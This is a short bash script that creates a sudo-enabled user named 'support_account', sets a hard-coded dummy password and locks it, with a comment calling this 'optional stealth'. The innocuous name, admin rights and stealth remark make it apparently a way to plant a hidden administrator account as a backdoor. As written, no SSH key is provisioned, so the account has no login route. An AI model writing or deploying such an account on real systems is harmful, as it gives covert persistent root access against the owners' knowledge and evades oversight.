#!/bin/bash
# Create a user named 'support_account'
sudo useradd -m support_account -s /bin/bash

# Add them to the sudo group (admin rights)
sudo usermod -aG sudo support_account

# Set a dummy password
echo "support_account:testpass123" | sudo chpasswd

# Lock the password so they can only login via SSH keys (optional stealth)
sudo passwd -l support_account
